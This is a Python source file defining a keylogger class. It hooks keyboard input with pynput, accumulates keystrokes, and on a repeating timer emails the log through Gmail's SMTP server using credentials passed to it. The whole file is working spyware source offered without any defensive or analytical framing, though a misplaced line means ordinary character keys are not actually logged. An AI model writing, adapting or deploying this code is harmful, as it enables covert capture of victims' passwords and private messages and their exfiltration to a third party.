#!/usr/bin/env python
'''
Keylogger class definition
'''


from pynput import keyboard
import threading, smtplib

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger started"
        self.interval, self.email, self.password = interval, email, password

    def append_to_log(self, string):
        self.log = self.log + string


    def process_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.append_to_log(current_key)

    def send_to_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


    def report(self):
        self.send_to_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def start(self):
        listener = keyboard.Listener(on_press=self.process_key)
        with listener:
            self.report()
            listener.join()
